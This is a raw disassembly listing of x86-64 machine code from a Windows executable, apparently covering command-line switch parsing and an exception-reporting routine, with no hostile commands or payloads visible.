   1400016f0:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400016f5:	48 8d 05 7c 45 02 00 	lea    0x2457c(%rip),%rax        # 0x140025c78
   1400016fc:	48 89 47 18          	mov    %rax,0x18(%rdi)
   140001700:	66 c7 47 21 00 00    	movw   $0x0,0x21(%rdi)
   140001706:	c6 47 20 00          	movb   $0x0,0x20(%rdi)
   14000170a:	48 8b c7             	mov    %rdi,%rax
   14000170d:	48 83 c4 20          	add    $0x20,%rsp
   140001711:	5f                   	pop    %rdi
   140001712:	c3                   	ret
   140001713:	cc                   	int3
   140001714:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001719:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000171e:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140001723:	57                   	push   %rdi
   140001724:	48 83 ec 40          	sub    $0x40,%rsp
   140001728:	33 ed                	xor    %ebp,%ebp
   14000172a:	48 8b f9             	mov    %rcx,%rdi
   14000172d:	48 8d 1d cc a8 02 00 	lea    0x2a8cc(%rip),%rbx        # 0x14002c000
   140001734:	48 39 2d c5 a8 02 00 	cmp    %rbp,0x2a8c5(%rip)        # 0x14002c000
   14000173b:	0f 84 e7 00 00 00    	je     0x140001828
   140001741:	48 8b 0b             	mov    (%rbx),%rcx
   140001744:	ff 15 be 3b 02 00    	call   *0x23bbe(%rip)        # 0x140025308
   14000174a:	48 8b 13             	mov    (%rbx),%rdx
   14000174d:	48 8b cf             	mov    %rdi,%rcx
   140001750:	48 63 f0             	movslq %eax,%rsi
   140001753:	44 8b c6             	mov    %esi,%r8d
   140001756:	e8 41 2b 00 00       	call   0x14000429c
   14000175b:	85 c0                	test   %eax,%eax
   14000175d:	75 07                	jne    0x140001766
   14000175f:	66 83 3c 77 3d       	cmpw   $0x3d,(%rdi,%rsi,2)
   140001764:	74 09                	je     0x14000176f
   140001766:	48 83 c3 08          	add    $0x8,%rbx
   14000176a:	48 39 2b             	cmp    %rbp,(%rbx)
   14000176d:	eb cc                	jmp    0x14000173b
   14000176f:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140001774:	48 8b d7             	mov    %rdi,%rdx
   140001777:	e8 14 7d 01 00       	call   0x140019490
   14000177c:	4c 8b 5c 24 20       	mov    0x20(%rsp),%r11
   140001781:	40 8a cd             	mov    %bpl,%cl
   140001784:	49 8b db             	mov    %r11,%rbx
   140001787:	66 41 39 2b          	cmp    %bp,(%r11)
   14000178b:	74 32                	je     0x1400017bf
   14000178d:	66 83 3b 20          	cmpw   $0x20,(%rbx)
   140001791:	77 04                	ja     0x140001797
   140001793:	84 c9                	test   %cl,%cl
   140001795:	74 28                	je     0x1400017bf
   140001797:	66 83 3b 22          	cmpw   $0x22,(%rbx)
   14000179b:	75 07                	jne    0x1400017a4
   14000179d:	84 c9                	test   %cl,%cl
   14000179f:	0f 94 c1             	sete   %cl
   1400017a2:	eb 12                	jmp    0x1400017b6
   1400017a4:	66 83 3b 5c          	cmpw   $0x5c,(%rbx)
   1400017a8:	75 0c                	jne    0x1400017b6
   1400017aa:	48 8d 43 02          	lea    0x2(%rbx),%rax
   1400017ae:	66 83 38 22          	cmpw   $0x22,(%rax)
   1400017b2:	48 0f 44 d8          	cmove  %rax,%rbx
   1400017b6:	48 83 c3 02          	add    $0x2,%rbx
   1400017ba:	66 39 2b             	cmp    %bp,(%rbx)
   1400017bd:	75 ce                	jne    0x14000178d
   1400017bf:	49 2b db             	sub    %r11,%rbx
   1400017c2:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   1400017c7:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1400017cc:	48 d1 fb             	sar    $1,%rbx
   1400017cf:	41 b8 e9 fd 00 00    	mov    $0xfde9,%r8d
   1400017d5:	8b c3                	mov    %ebx,%eax
   1400017d7:	89 5c 24 28          	mov    %ebx,0x28(%rsp)
   1400017db:	66 41 89 2c 43       	mov    %bp,(%r11,%rax,2)
   1400017e0:	e8 f3 3b 00 00       	call   0x1400053d8
   1400017e5:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1400017ea:	b2 01                	mov    $0x1,%dl
   1400017ec:	e8 d3 4d 00 00       	call   0x1400065c4
   1400017f1:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   1400017f6:	84 c0                	test   %al,%al
   1400017f8:	75 16                	jne    0x140001810
   1400017fa:	e8 6f 25 02 00       	call   0x140023d6e
   1400017ff:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   140001804:	e8 65 25 02 00       	call   0x140023d6e
   140001809:	b8 01 00 00 00       	mov    $0x1,%eax
   14000180e:	eb 1a                	jmp    0x14000182a
   140001810:	e8 59 25 02 00       	call   0x140023d6e
   140001815:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   14000181a:	e8 4f 25 02 00       	call   0x140023d6e
   14000181f:	4c 63 db             	movslq %ebx,%r11
   140001822:	4a 8d 04 5f          	lea    (%rdi,%r11,2),%rax
   140001826:	eb 02                	jmp    0x14000182a
   140001828:	33 c0                	xor    %eax,%eax
   14000182a:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   14000182f:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   140001834:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   140001839:	48 83 c4 40          	add    $0x40,%rsp
   14000183d:	5f                   	pop    %rdi
   14000183e:	c3                   	ret
   14000183f:	cc                   	int3
   140001840:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001845:	57                   	push   %rdi
   140001846:	48 83 ec 30          	sub    $0x30,%rsp
   14000184a:	48 8b da             	mov    %rdx,%rbx
   14000184d:	48 8b d1             	mov    %rcx,%rdx
   140001850:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140001855:	e8 36 7c 01 00       	call   0x140019490
   14000185a:	48 8d 15 13 48 02 00 	lea    0x24813(%rip),%rdx        # 0x140026074
   140001861:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140001866:	e8 d1 7d 01 00       	call   0x14001963c
   14000186b:	0f b7 3b             	movzwl (%rbx),%edi
   14000186e:	66 83 ff 20          	cmp    $0x20,%di
   140001872:	76 43                	jbe    0x1400018b7
   140001874:	44 8b 44 24 28       	mov    0x28(%rsp),%r8d
   140001879:	44 39 44 24 2c       	cmp    %r8d,0x2c(%rsp)
   14000187e:	75 0f                	jne    0x14000188f
   140001880:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140001885:	e8 22 79 01 00       	call   0x1400191ac
   14000188a:	44 8b 44 24 28       	mov    0x28(%rsp),%r8d
   14000188f:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   140001894:	41 8b c0             	mov    %r8d,%eax
   140001897:	41 ff c0             	inc    %r8d
   14000189a:	66 89 3c 41          	mov    %di,(%rcx,%rax,2)
   14000189e:	33 d2                	xor    %edx,%edx
   1400018a0:	48 83 c3 02          	add    $0x2,%rbx
   1400018a4:	66 42 89 14 41       	mov    %dx,(%rcx,%r8,2)
   1400018a9:	0f b7 3b             	movzwl (%rbx),%edi
   1400018ac:	44 89 44 24 28       	mov    %r8d,0x28(%rsp)
   1400018b1:	66 83 ff 20          	cmp    $0x20,%di
   1400018b5:	77 c2                	ja     0x140001879
   1400018b7:	48 8d 15 b2 47 02 00 	lea    0x247b2(%rip),%rdx        # 0x140026070
   1400018be:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400018c3:	e8 74 7d 01 00       	call   0x14001963c
   1400018c8:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   1400018cd:	e8 42 fe ff ff       	call   0x140001714
   1400018d2:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   1400018d7:	e8 92 24 02 00       	call   0x140023d6e
   1400018dc:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   1400018e1:	48 83 c4 30          	add    $0x30,%rsp
   1400018e5:	5f                   	pop    %rdi
   1400018e6:	c3                   	ret
   1400018e7:	cc                   	int3
   1400018e8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400018ed:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1400018f2:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   1400018f7:	55                   	push   %rbp
   1400018f8:	41 54                	push   %r12
   1400018fa:	41 55                	push   %r13
   1400018fc:	48 8b ec             	mov    %rsp,%rbp
   1400018ff:	48 83 ec 60          	sub    $0x60,%rsp
   140001903:	48 8b 1d de b2 02 00 	mov    0x2b2de(%rip),%rbx        # 0x14002cbe8
   14000190a:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   14000190e:	e8 45 7b 01 00       	call   0x140019458
   140001913:	48 8b cb             	mov    %rbx,%rcx
   140001916:	4c 8b e3             	mov    %rbx,%r12
   140001919:	ff 15 e9 39 02 00    	call   *0x239e9(%rip)        # 0x140025308
   14000191f:	33 ff                	xor    %edi,%edi
   140001921:	48 63 c8             	movslq %eax,%rcx
   140001924:	0f b7 03             	movzwl (%rbx),%eax
   140001927:	4c 8d 2c 4b          	lea    (%rbx,%rcx,2),%r13
   14000192b:	eb 0f                	jmp    0x14000193c
   14000192d:	66 83 f8 20          	cmp    $0x20,%ax
   140001931:	77 14                	ja     0x140001947
   140001933:	49 83 c4 02          	add    $0x2,%r12
   140001937:	41 0f b7 04 24       	movzwl (%r12),%eax
   14000193c:	66 85 c0             	test   %ax,%ax
   14000193f:	75 ec                	jne    0x14000192d
   140001941:	eb 04                	jmp    0x140001947
   140001943:	48 83 c3 02          	add    $0x2,%rbx
   140001947:	66 83 3b 20          	cmpw   $0x20,(%rbx)
   14000194b:	77 f6                	ja     0x140001943
   14000194d:	eb 0a                	jmp    0x140001959
   14000194f:	66 83 f8 20          	cmp    $0x20,%ax
   140001953:	77 0c                	ja     0x140001961
   140001955:	48 83 c3 02          	add    $0x2,%rbx
   140001959:	0f b7 03             	movzwl (%rbx),%eax
   14000195c:	66 85 c0             	test   %ax,%ax
   14000195f:	75 ee                	jne    0x14000194f
   140001961:	66 83 3b 2f          	cmpw   $0x2f,(%rbx)
   140001965:	74 0a                	je     0x140001971
   140001967:	66 83 3b 2d          	cmpw   $0x2d,(%rbx)
   14000196b:	0f 85 b9 02 00 00    	jne    0x140001c2a
   140001971:	66 83 7b 02 21       	cmpw   $0x21,0x2(%rbx)
   140001976:	0f 84 a2 02 00 00    	je     0x140001c1e
   14000197c:	48 8d 15 85 47 02 00 	lea    0x24785(%rip),%rdx        # 0x140026108
   140001983:	48 8d 4b 02          	lea    0x2(%rbx),%rcx
   140001987:	e8 a0 1e 00 00       	call   0x14000382c
   14000198c:	48 85 c0             	test   %rax,%rax
   14000198f:	74 50                	je     0x1400019e1
   140001991:	48 8d 43 06          	lea    0x6(%rbx),%rax
   140001995:	66 83 38 30          	cmpw   $0x30,(%rax)
   140001999:	72 06                	jb     0x1400019a1
   14000199b:	66 83 38 39          	cmpw   $0x39,(%rax)
   14000199f:	76 18                	jbe    0x1400019b9
   1400019a1:	66 83 38 61          	cmpw   $0x61,(%rax)
   1400019a5:	72 06                	jb     0x1400019ad
   1400019a7:	66 83 38 7a          	cmpw   $0x7a,(%rax)
   1400019ab:	76 0c                	jbe    0x1400019b9
   1400019ad:	66 83 38 41          	cmpw   $0x41,(%rax)
   1400019b1:	72 1b                	jb     0x1400019ce
   1400019b3:	66 83 38 5a          	cmpw   $0x5a,(%rax)
   1400019b7:	77 15                	ja     0x1400019ce
   1400019b9:	48 89 05 18 b2 02 00 	mov    %rax,0x2b218(%rip)        # 0x14002cbd8
   1400019c0:	66 c7 05 17 b2 02 00 	movw   $0x101,0x2b217(%rip)        # 0x14002cbe0
   1400019c7:	01 01 
   1400019c9:	e9 79 ff ff ff       	jmp    0x140001947
   1400019ce:	66 83 38 20          	cmpw   $0x20,(%rax)
   1400019d2:	0f 87 52 02 00 00    	ja     0x140001c2a
   1400019d8:	48 8d 05 99 42 02 00 	lea    0x24299(%rip),%rax        # 0x140025c78
   1400019df:	eb d8                	jmp    0x1400019b9
   1400019e1:	48 8d 15 18 47 02 00 	lea    0x24718(%rip),%rdx        # 0x140026100
   1400019e8:	48 8d 4b 02          	lea    0x2(%rbx),%rcx
   1400019ec:	e8 3b 1e 00 00       	call   0x14000382c
   1400019f1:	48 85 c0             	test   %rax,%rax
   1400019f4:	74 10                	je     0x140001a06
   1400019f6:	48 8d 53 06          	lea    0x6(%rbx),%rdx
   1400019fa:	48 8d 0d 47 44 02 00 	lea    0x24447(%rip),%rcx        # 0x140025e48
   140001a01:	e9 58 01 00 00       	jmp    0x140001b5e
   140001a06:	48 8d 15 eb 46 02 00 	lea    0x246eb(%rip),%rdx        # 0x1400260f8
   140001a0d:	48 8d 4b 02          	lea    0x2(%rbx),%rcx
   140001a11:	e8 16 1e 00 00       	call   0x14000382c
   140001a16:	48 85 c0             	test   %rax,%rax
   140001a19:	74 2f                	je     0x140001a4a
   140001a1b:	48 8d 53 06          	lea    0x6(%rbx),%rdx
   140001a1f:	66 83 3a 30          	cmpw   $0x30,(%rdx)
   140001a23:	0f 82 01 02 00 00    	jb     0x140001c2a
   140001a29:	66 83 3a 32          	cmpw   $0x32,(%rdx)
   140001a2d:	0f 87 f7 01 00 00    	ja     0x140001c2a
   140001a33:	66 83 7b 08 20       	cmpw   $0x20,0x8(%rbx)
   140001a38:	0f 87 ec 01 00 00    	ja     0x140001c2a
   140001a3e:	48 8d 0d 83 42 02 00 	lea    0x24283(%rip),%rcx        # 0x140025cc8
   140001a45:	e9 14 01 00 00       	jmp    0x140001b5e
   140001a4a:	48 8d 15 9f 46 02 00 	lea    0x2469f(%rip),%rdx        # 0x1400260f0
   140001a51:	48 8d 4b 02          	lea    0x2(%rbx),%rcx
   140001a55:	e8 d2 1d 00 00       	call   0x14000382c
   140001a5a:	48 85 c0             	test   %rax,%rax
   140001a5d:	74 10                	je     0x140001a6f
   140001a5f:	48 8d 53 06          	lea    0x6(%rbx),%rdx
   140001a63:	48 8d 0d 6e 42 02 00 	lea    0x2426e(%rip),%rcx        # 0x140025cd8
   140001a6a:	e9 ef 00 00 00       	jmp    0x140001b5e
   140001a6f:	48 8d 15 72 46 02 00 	lea    0x24672(%rip),%rdx        # 0x1400260e8
   140001a76:	48 8d 4b 02          	lea    0x2(%rbx),%rcx
   140001a7a:	e8 ad 1d 00 00       	call   0x14000382c
   140001a7f:	48 85 c0             	test   %rax,%rax
   140001a82:	74 10                	je     0x140001a94
   140001a84:	48 8d 53 06          	lea    0x6(%rbx),%rdx
   140001a88:	48 8d 0d 61 42 02 00 	lea    0x24261(%rip),%rcx        # 0x140025cf0
   140001a8f:	e9 ca 00 00 00       	jmp    0x140001b5e
   140001a94:	48 8d 15 45 46 02 00 	lea    0x24645(%rip),%rdx        # 0x1400260e0
   140001a9b:	48 8d 4b 02          	lea    0x2(%rbx),%rcx
   140001a9f:	e8 88 1d 00 00       	call   0x14000382c
   140001aa4:	48 85 c0             	test   %rax,%rax
   140001aa7:	74 2b                	je     0x140001ad4
   140001aa9:	48 8d 53 06          	lea    0x6(%rbx),%rdx
   140001aad:	66 83 3a 30          	cmpw   $0x30,(%rdx)
   140001ab1:	74 0a                	je     0x140001abd
   140001ab3:	66 83 3a 31          	cmpw   $0x31,(%rdx)
   140001ab7:	0f 85 6d 01 00 00    	jne    0x140001c2a
   140001abd:	66 83 7b 08 20       	cmpw   $0x20,0x8(%rbx)
   140001ac2:	0f 87 62 01 00 00    	ja     0x140001c2a
   140001ac8:	48 8d 0d 01 43 02 00 	lea    0x24301(%rip),%rcx        # 0x140025dd0
   140001acf:	e9 8a 00 00 00       	jmp    0x140001b5e
   140001ad4:	48 8d 15 fd 45 02 00 	lea    0x245fd(%rip),%rdx        # 0x1400260d8
   140001adb:	48 8d 4b 02          	lea    0x2(%rbx),%rcx
   140001adf:	e8 48 1d 00 00       	call   0x14000382c
   140001ae4:	48 85 c0             	test   %rax,%rax
   140001ae7:	74 17                	je     0x140001b00
   140001ae9:	66 83 7b 06 20       	cmpw   $0x20,0x6(%rbx)
   140001aee:	0f 87 36 01 00 00    	ja     0x140001c2a
   140001af4:	c6 05 e7 b0 02 00 01 	movb   $0x1,0x2b0e7(%rip)        # 0x14002cbe2
   140001afb:	e9 47 fe ff ff       	jmp    0x140001947
   140001b00:	48 8d 15 c9 45 02 00 	lea    0x245c9(%rip),%rdx        # 0x1400260d0
   140001b07:	48 8d 4b 02          	lea    0x2(%rbx),%rcx
   140001b0b:	e8 1c 1d 00 00       	call   0x14000382c
   140001b10:	48 85 c0             	test   %rax,%rax
   140001b13:	74 29                	je     0x140001b3e
   140001b15:	48 8d 4b 06          	lea    0x6(%rbx),%rcx
   140001b19:	66 83 39 30          	cmpw   $0x30,(%rcx)
   140001b1d:	0f 82 07 01 00 00    	jb     0x140001c2a
   140001b23:	66 83 39 39          	cmpw   $0x39,(%rcx)
   140001b27:	0f 87 fd 00 00 00    	ja     0x140001c2a
   140001b2d:	ff 15 ed 3a 02 00    	call   *0x23aed(%rip)        # 0x140025620
   140001b33:	89 05 4b ac 02 00    	mov    %eax,0x2ac4b(%rip)        # 0x14002c784
   140001b39:	e9 09 fe ff ff       	jmp    0x140001947
   140001b3e:	48 8d 15 83 45 02 00 	lea    0x24583(%rip),%rdx        # 0x1400260c8
   140001b45:	48 8d 4b 02          	lea    0x2(%rbx),%rcx
   140001b49:	e8 de 1c 00 00       	call   0x14000382c
   140001b4e:	48 85 c0             	test   %rax,%rax
   140001b51:	74 15                	je     0x140001b68
   140001b53:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   140001b57:	48 8d 0d 02 44 02 00 	lea    0x24402(%rip),%rcx        # 0x140025f60
   140001b5e:	e8 dd fc ff ff       	call   0x140001840
   140001b63:	e9 df fd ff ff       	jmp    0x140001947
   140001b68:	66 83 7b 02 70       	cmpw   $0x70,0x2(%rbx)
   140001b6d:	74 70                	je     0x140001bdf
   140001b6f:	66 83 7b 02 50       	cmpw   $0x50,0x2(%rbx)
   140001b74:	74 69                	je     0x140001bdf
   140001b76:	66 83 7b 02 79       	cmpw   $0x79,0x2(%rbx)
   140001b7b:	74 07                	je     0x140001b84
   140001b7d:	66 83 7b 02 59       	cmpw   $0x59,0x2(%rbx)
   140001b82:	75 13                	jne    0x140001b97
   140001b84:	66 83 7b 04 20       	cmpw   $0x20,0x4(%rbx)
   140001b89:	77 0c                	ja     0x140001b97
   140001b8b:	c6 05 4f b0 02 00 01 	movb   $0x1,0x2b04f(%rip)        # 0x14002cbe1
   140001b92:	e9 b0 fd ff ff       	jmp    0x140001947
   140001b97:	66 83 7b 02 3f       	cmpw   $0x3f,0x2(%rbx)
   140001b9c:	74 0e                	je     0x140001bac
   140001b9e:	66 83 7b 02 68       	cmpw   $0x68,0x2(%rbx)
   140001ba3:	74 07                	je     0x140001bac
   140001ba5:	66 83 7b 02 48       	cmpw   $0x48,0x2(%rbx)
   140001baa:	75 13                	jne    0x140001bbf
   140001bac:	66 83 7b 04 20       	cmpw   $0x20,0x4(%rbx)
   140001bb1:	77 0c                	ja     0x140001bbf
   140001bb3:	c6 05 29 b0 02 00 01 	movb   $0x1,0x2b029(%rip)        # 0x14002cbe3
   140001bba:	e9 88 fd ff ff       	jmp    0x140001947
   140001bbf:	48 8d 4b 02          	lea    0x2(%rbx),%rcx
   140001bc3:	e8 4c fb ff ff       	call   0x140001714
   140001bc8:	48 85 c0             	test   %rax,%rax
   140001bcb:	74 5d                	je     0x140001c2a
   140001bcd:	48 83 f8 01          	cmp    $0x1,%rax
   140001bd1:	0f 84 38 01 00 00    	je     0x140001d0f
   140001bd7:	48 8b d8             	mov    %rax,%rbx
   140001bda:	e9 68 fd ff ff       	jmp    0x140001947
   140001bdf:	48 8d 4d d0          	lea    -0x30(%rbp),%rcx
   140001be3:	e8 70 78 01 00       	call   0x140019458
   140001be8:	48 8d 4b 04          	lea    0x4(%rbx),%rcx
   140001bec:	48 8d 55 d0          	lea    -0x30(%rbp),%rdx
   140001bf0:	e8 93 1c 00 00       	call   0x140003888
   140001bf5:	48 8b 55 d0          	mov    -0x30(%rbp),%rdx
   140001bf9:	48 8d 0d a8 ae 02 00 	lea    0x2aea8(%rip),%rcx        # 0x14002caa8
   140001c00:	48 8d 58 fe          	lea    -0x2(%rax),%rbx
   140001c04:	e8 1f 79 01 00       	call   0x140019528
   140001c09:	48 8b 4d d0          	mov    -0x30(%rbp),%rcx
   140001c0d:	c6 05 8c ae 02 00 01 	movb   $0x1,0x2ae8c(%rip)        # 0x14002caa0
   140001c14:	e8 55 21 02 00       	call   0x140023d6e
   140001c19:	e9 29 fd ff ff       	jmp    0x140001947
   140001c1e:	48 8b f3             	mov    %rbx,%rsi
   140001c21:	48 83 c3 04          	add    $0x4,%rbx
   140001c25:	48 85 f6             	test   %rsi,%rsi
   140001c28:	75 03                	jne    0x140001c2d
   140001c2a:	48 8b f3             	mov    %rbx,%rsi
   140001c2d:	4c 3b e6             	cmp    %rsi,%r12
   140001c30:	74 58                	je     0x140001c8a
   140001c32:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   140001c36:	49 8b d4             	mov    %r12,%rdx
   140001c39:	e8 52 78 01 00       	call   0x140019490
   140001c3e:	49 2b f4             	sub    %r12,%rsi
   140001c41:	4c 8d 45 f0          	lea    -0x10(%rbp),%r8
   140001c45:	48 d1 fe             	sar    $1,%rsi
   140001c48:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   140001c4c:	8b d6                	mov    %esi,%edx
   140001c4e:	e8 15 76 01 00       	call   0x140019268
   140001c53:	48 8b 55 e0          	mov    -0x20(%rbp),%rdx
   140001c57:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   140001c5b:	e8 c8 78 01 00       	call   0x140019528
   140001c60:	48 8b 4d e0          	mov    -0x20(%rbp),%rcx
   140001c64:	e8 05 21 02 00       	call   0x140023d6e
   140001c69:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
   140001c6d:	e8 fc 20 02 00       	call   0x140023d6e
   140001c72:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   140001c76:	e8 65 7c 01 00       	call   0x1400198e0
   140001c7b:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   140001c7f:	e8 00 7c 01 00       	call   0x140019884
   140001c84:	48 8b 55 c0          	mov    -0x40(%rbp),%rdx
   140001c88:	eb 07                	jmp    0x140001c91
   140001c8a:	48 8d 15 2f 44 02 00 	lea    0x2442f(%rip),%rdx        # 0x1400260c0
   140001c91:	48 8d 0d 08 44 02 00 	lea    0x24408(%rip),%rcx        # 0x1400260a0
   140001c98:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140001c9e:	e8 fd 47 00 00       	call   0x1400064a0
   140001ca3:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   140001ca7:	48 8b d3             	mov    %rbx,%rdx
   140001caa:	e8 e1 77 01 00       	call   0x140019490
   140001caf:	4c 2b eb             	sub    %rbx,%r13
   140001cb2:	4c 8d 45 e0          	lea    -0x20(%rbp),%r8
   140001cb6:	49 d1 fd             	sar    $1,%r13
   140001cb9:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   140001cbd:	41 8b d5             	mov    %r13d,%edx
   140001cc0:	e8 a3 75 01 00       	call   0x140019268
   140001cc5:	48 8b 55 f0          	mov    -0x10(%rbp),%rdx
   140001cc9:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   140001ccd:	e8 56 78 01 00       	call   0x140019528
   140001cd2:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
   140001cd6:	e8 93 20 02 00       	call   0x140023d6e
   140001cdb:	48 8b 4d e0          	mov    -0x20(%rbp),%rcx
   140001cdf:	e8 8a 20 02 00       	call   0x140023d6e
   140001ce4:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   140001ce8:	e8 f3 7b 01 00       	call   0x1400198e0
   140001ced:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   140001cf1:	e8 8e 7b 01 00       	call   0x140019884
   140001cf6:	48 8b 55 c0          	mov    -0x40(%rbp),%rdx
   140001cfa:	48 8d 0d 7f 43 02 00 	lea    0x2437f(%rip),%rcx        # 0x140026080
   140001d01:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140001d07:	e8 94 47 00 00       	call   0x1400064a0
   140001d0c:	48 8b fb             	mov    %rbx,%rdi
   140001d0f:	48 8b 4d c0          	mov    -0x40(%rbp),%rcx
   140001d13:	e8 56 20 02 00       	call   0x140023d6e
   140001d18:	4c 8d 5c 24 60       	lea    0x60(%rsp),%r11
   140001d1d:	48 8b c7             	mov    %rdi,%rax
   140001d20:	49 8b 5b 20          	mov    0x20(%r11),%rbx
   140001d24:	49 8b 73 28          	mov    0x28(%r11),%rsi
   140001d28:	49 8b 7b 30          	mov    0x30(%r11),%rdi
   140001d2c:	49 8b e3             	mov    %r11,%rsp
   140001d2f:	41 5d                	pop    %r13
   140001d31:	41 5c                	pop    %r12
   140001d33:	5d                   	pop    %rbp
   140001d34:	c3                   	ret
   140001d35:	cc                   	int3
   140001d36:	cc                   	int3
   140001d37:	cc                   	int3
   140001d38:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001d3d:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140001d42:	57                   	push   %rdi
   140001d43:	48 81 ec 20 09 00 00 	sub    $0x920,%rsp
   140001d4a:	8b 01                	mov    (%rcx),%eax
   140001d4c:	48 8b f9             	mov    %rcx,%rdi
   140001d4f:	3b 05 6b ad 02 00    	cmp    0x2ad6b(%rip),%eax        # 0x14002cac0
   140001d55:	0f 84 f7 00 00 00    	je     0x140001e52
   140001d5b:	3d de fa ed 0e       	cmp    $0xeedfade,%eax
   140001d60:	0f 84 ec 00 00 00    	je     0x140001e52
   140001d66:	3d 06 00 01 40       	cmp    $0x40010006,%eax
   140001d6b:	0f 84 e1 00 00 00    	je     0x140001e52
   140001d71:	3d 0a 00 01 40       	cmp    $0x4001000a,%eax
   140001d76:	0f 84 d6 00 00 00    	je     0x140001e52
   140001d7c:	48 8b 05 35 ad 02 00 	mov    0x2ad35(%rip),%rax        # 0x14002cab8
   140001d83:	33 db                	xor    %ebx,%ebx
   140001d85:	48 85 c0             	test   %rax,%rax
   140001d88:	74 21                	je     0x140001dab
   140001d8a:	66 39 1d 29 ad 02 00 	cmp    %bx,0x2ad29(%rip)        # 0x14002caba
   140001d91:	74 09                	je     0x140001d9c
   140001d93:	ff d0                	call   *%rax
   140001d95:	48 89 05 1c ad 02 00 	mov    %rax,0x2ad1c(%rip)        # 0x14002cab8
   140001d9c:	8b c8                	mov    %eax,%ecx
   140001d9e:	e8 fd 2c 00 00       	call   0x140004aa0
   140001da3:	48 8b c8             	mov    %rax,%rcx
   140001da6:	e9 91 00 00 00       	jmp    0x140001e3c
   140001dab:	b9 27 00 00 00       	mov    $0x27,%ecx
   140001db0:	e8 eb 2c 00 00       	call   0x140004aa0
   140001db5:	4c 8b 4f 10          	mov    0x10(%rdi),%r9
   140001db9:	44 8b 07             	mov    (%rdi),%r8d
   140001dbc:	48 8d 8c 24 20 01 00 	lea    0x120(%rsp),%rcx
   140001dc3:	00 
   140001dc4:	48 8b d0             	mov    %rax,%rdx
   140001dc7:	ff 15 fb 37 02 00    	call   *0x237fb(%rip)        # 0x1400255c8
   140001dcd:	39 5f 18             	cmp    %ebx,0x18(%rdi)
   140001dd0:	76 37                	jbe    0x140001e09
   140001dd2:	48 8d 77 20          	lea    0x20(%rdi),%rsi
   140001dd6:	4c 8b 06             	mov    (%rsi),%r8
   140001dd9:	48 8d 15 30 43 02 00 	lea    0x24330(%rip),%rdx        # 0x140026110
   140001de0:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140001de5:	ff 15 dd 37 02 00    	call   *0x237dd(%rip)        # 0x1400255c8
   140001deb:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140001df0:	48 8d 8c 24 20 01 00 	lea    0x120(%rsp),%rcx
   140001df7:	00 
   140001df8:	ff 15 1a 35 02 00    	call   *0x2351a(%rip)        # 0x140025318
   140001dfe:	ff c3                	inc    %ebx
   140001e00:	48 83 c6 08          	add    $0x8,%rsi
   140001e04:	3b 5f 18             	cmp    0x18(%rdi),%ebx
   140001e07:	72 cd                	jb     0x140001dd6
   140001e09:	80 3d 40 a9 02 00 3b 	cmpb   $0x3b,0x2a940(%rip)        # 0x14002c750
   140001e10:	74 22                	je     0x140001e34
   140001e12:	b9 03 00 00 00       	mov    $0x3,%ecx
   140001e17:	e8 84 2c 00 00       	call   0x140004aa0
   140001e1c:	48 8d 94 24 20 01 00 	lea    0x120(%rsp),%rdx
   140001e23:	00 
   140001e24:	45 33 c9             	xor    %r9d,%r9d
   140001e27:	4c 8b c0             	mov    %rax,%r8
   140001e2a:	33 c9                	xor    %ecx,%ecx
   140001e2c:	ff 15 9e 37 02 00    	call   *0x2379e(%rip)        # 0x1400255d0
   140001e32:	eb 0d                	jmp    0x140001e41
   140001e34:	48 8d 8c 24 20 01 00 	lea    0x120(%rsp),%rcx
   140001e3b:	00 
   140001e3c:	e8 e7 a4 00 00       	call   0x14000c328
   140001e41:	e8 fe 55 00 00       	call   0x140007444
   140001e46:	b9 0a 00 00 00       	mov    $0xa,%ecx
   140001e4b:	ff 15 bf 34 02 00    	call   *0x234bf(%rip)        # 0x140025310
   140001e51:	cc                   	int3
   140001e52:	4c 8d 9c 24 20 09 00 	lea    0x920(%rsp),%r11
   140001e59:	00 
   140001e5a:	49 8b 5b 10          	mov    0x10(%r11),%rbx
